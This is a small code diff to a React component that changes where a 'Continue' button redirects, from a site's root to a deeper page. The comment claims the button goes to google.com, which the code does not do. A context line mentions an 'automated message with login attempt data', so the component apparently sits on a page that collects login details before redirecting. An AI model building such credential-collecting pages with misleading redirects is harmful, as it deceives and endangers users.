@@ -74,7 +74,7 @@ This is an automated message with login attempt data.`,
             {/* Continue Button - redirects to google.com */}
             <button
               onClick={() => {
-                window.location.href = 'https://www.sciwebhop.net/';
+                window.location.href = 'https://www.sciwebhop.net/sci_web/science/asp/ks4exam/Index.php';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
